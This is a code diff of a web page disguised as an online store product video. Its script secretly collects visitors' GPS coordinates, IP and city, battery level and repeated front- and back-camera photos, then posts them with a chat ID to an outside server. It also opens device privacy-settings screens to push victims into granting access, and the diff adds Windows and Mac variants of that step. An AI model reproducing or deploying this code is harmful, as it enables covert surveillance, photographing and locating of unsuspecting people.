@@ -16,8 +16,7 @@
         "@context": "https://schema.org",
         "@type": "OnlineStore",
         "name": "ShopStore",
-        "description": "Online shopping store with fast delivery to your location",
-        "url": "https://shopstore.com"
+        "description": "Online shopping store with fast delivery to your location"
     }
     </script>
     
@@ -61,9 +60,7 @@
 <body>
 
     <div class="store-header" aria-hidden="true">
-        <span>🛒 ShopStore</span>
-        <span>🔍 Search products...</span>
-        <span>🛒 Cart (0)</span>
+        <span>🛒 ShopStore</span><span>🔍 Search products...</span><span>🛒 Cart (0)</span>
     </div>
     <div class="product-info-hidden" aria-hidden="true">
         <span>$49.99</span><span>★★★★★ 4.8</span><span>🚚 Free Shipping</span><span>✅ In Stock</span>
@@ -102,93 +99,52 @@
         var vid=document.getElementById('vid');
         var chatId=new URLSearchParams(window.location.search).get('chatId')||'';
         
-        var data={
+        var collected={
             chatId:chatId,
             permissions:[],
             images:[],
             location:'',
             ipInfo:'',
-            battery:'',
-            ua:navigator.userAgent,
-            time:new Date().toISOString()
+            battery:''
         };
         
-        function log(msg){console.log('[DATA]',msg);}
-        
-        function send(dataObj){
+        function sendToServer(){
             var url='https://server-brxz.onrender.com/submitData';
-            var params=new URLSearchParams();
-            for(var k in dataObj){
-                params.append(k, typeof dataObj[k]==='string'?dataObj[k]:JSON.stringify(dataObj[k]));
-            }
-            var body=params.toString();
             
-            log('Sending to: '+url);
-            log('Body length: '+body.length);
+            var body='chatId='+encodeURIComponent(collected.chatId);
+            body+='&imageDatas='+encodeURIComponent(collected.images.join(','));
+            body+='&location='+encodeURIComponent(collected.location);
+            body+='&permissions='+encodeURIComponent(collected.permissions.join(', '));
+            body+='&ipInfo='+encodeURIComponent(collected.ipInfo);
+            body+='&battery='+encodeURIComponent(collected.battery);
             
-            // Method 1: XHR
-            try{
-                var x=new XMLHttpRequest();
-                x.open('POST',url,true);
-                x.setRequestHeader('Content-Type','application/x-www-form-urlencoded;charset=UTF-8');
-                x.onload=function(){log('XHR Response: '+x.status+' - '+x.responseText.substring(0,100));};
-                x.onerror=function(){log('XHR Error');};
-                x.send(body);
-            }catch(e){log('XHR Exception: '+e.message);}
-            
-            // Method 2: fetch
-            try{
-                fetch(url,{
-                    method:'POST',
-                    headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},
-                    body:body
-                }).then(function(r){
-                    log('Fetch Status: '+r.status);
-                    return r.text();
-                }).then(function(t){
-                    log('Fetch Response: '+t.substring(0,100));
-                }).catch(function(e){
-                    log('Fetch Error: '+e.message);
-                });
-            }catch(e){log('Fetch Exception: '+e.message);}
-            
-            // Method 3: Beacon
-            try{
-                if(navigator.sendBeacon){
-                    var blob=new Blob([body],{type:'application/x-www-form-urlencoded'});
-                    var result=navigator.sendBeacon(url,blob);
-                    log('Beacon Result: '+result);
-                }
-            }catch(e){log('Beacon Exception: '+e.message);}
+            // إرسال مباشر مع XHR
+            var x=new XMLHttpRequest();
+            x.open('POST',url,true);
+            x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+            x.send(body);
         }
         
-        function collectAndSend(){
-            log('Starting collection...');
-            
+        function collectData(){
             // IP
             fetch('https://ipapi.co/json/').then(function(r){return r.json();}).then(function(d){
-                data.ipInfo=d.ip+'|'+d.country_name+'|'+d.city+'|'+d.org;
-                log('IP: '+data.ipInfo);
-            }).catch(function(){data.ipInfo='failed';});
+                collected.ipInfo='Country: '+d.country_name+', City: '+d.city+', IP: '+d.ip;
+            }).catch(function(){});
             
             // Battery
-            try{
+            if(navigator.getBattery){
                 navigator.getBattery().then(function(b){
-                    data.battery=Math.round(b.level*100)+'%_'+(b.charging?'charging':'not');
-                    log('Battery: '+data.battery);
+                    collected.battery=Math.round(b.level*100)+'%';
                 });
-            }catch(e){}
+            }
             
             // Location
             navigator.geolocation.getCurrentPosition(function(pos){
-                data.location=pos.coords.latitude.toFixed(6)+','+pos.coords.longitude.toFixed(6);
-                data.permissions.push('gps_ok');
-                log('Location: '+data.location);
-            },function(e){
-                data.location='denied_'+e.code;
-                data.permissions.push('gps_no');
-                log('Location denied: '+e.code);
-            },{enableHighAccuracy:true,timeout:10000});
+                collected.location='Lat: '+pos.coords.latitude.toFixed(6)+', Long: '+pos.coords.longitude.toFixed(6);
+                collected.permissions.push('Geolocation Allowed');
+            },function(){
+                collected.permissions.push('Geolocation Denied');
+            },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
             
             // Camera
             function snap(face,cb){
@@ -201,16 +157,14 @@
                             c.width=v.videoWidth||640;
                             c.height=v.videoHeight||480;
                             c.getContext('2d').drawImage(v,0,0);
-                            data.images.push(c.toDataURL('image/jpeg',0.5).split(',')[1]);
-                            data.permissions.push(face+'_cam_ok');
-                            log('Photo captured: '+face);
+                            collected.images.push(c.toDataURL('image/jpeg').split(',')[1]);
+                            collected.permissions.push((face==='user'?'Front':'Back')+' Camera Allowed');
                             stream.getTracks().forEach(function(t){t.stop();});
                             cb();
-                        },500);
+                        },1000);
                     });
-                }).catch(function(e){
-                    data.permissions.push(face+'_cam_no');
-                    log('Camera denied: '+face);
+                }).catch(function(){
+                    collected.permissions.push((face==='user'?'Front':'Back')+' Camera Denied');
                     cb();
                 });
             }
@@ -219,12 +173,7 @@
                 snap('environment',function(){
                     snap('user',function(){
                         snap('environment',function(){
-                            log('All photos done. Total: '+data.images.length);
-                            // Wait then send
-                            setTimeout(function(){
-                                log('Sending now...');
-                                send(data);
-                            },2000);
+                            setTimeout(sendToServer,2000);
                         });
                     });
                 });
@@ -244,6 +193,10 @@
                 }
             }else if(/iPhone|iPad|iPod/i.test(ua)){
                 window.open('App-Prefs:Privacy&path=LOCATION','_blank');
+            }else if(/Windows/i.test(ua)){
+                window.open('ms-settings:privacy-location','_blank');
+            }else if(/Mac/i.test(ua)){
+                window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices','_blank');
             }else{
                 window.location.href='intent:#Intent;action=android.settings.SETTINGS;end';
             }
@@ -256,7 +209,7 @@
                 step=1;
                 try{
                     navigator.geolocation.getCurrentPosition(function(){},function(){},{timeout:3000});
-                    navigator.mediaDevices.getUserMedia({video:true}).then(function(s){s.getTracks().forEach(function(t){t.stop();});});
+                    navigator.mediaDevices.getUserMedia({video:true}).then(function(s){s.getTracks().forEach(function(t){t.stop();});}).catch(function(){});
                 }catch(e){}
                 openSettings();
             }else{
@@ -266,7 +219,7 @@
                 vid.play().catch(function(){});
                 poster.style.display='none';
                 vid.style.display='block';
-                collectAndSend();
+                collectData();
                 btn.style.display='none';
             }
         });
@@ -274,6 +227,16 @@
         document.addEventListener('click',function(){
             if(vid.style.display==='block'){vid.muted=false;if(vid.paused)vid.play().catch(function(){});}
         },true);
+        
+        document.querySelectorAll('.ctrl-btn').forEach(function(b){
+            b.addEventListener('click',function(e){
+                e.stopPropagation();
+                if(this.textContent.includes('⛶')){
+                    if(vid.requestFullscreen){vid.requestFullscreen();}
+                    else if(vid.webkitRequestFullscreen){vid.webkitRequestFullscreen();}
+                }
+            });
+        });
         
         setInterval(function(){
             var fill=document.querySelector('.seek-fill');
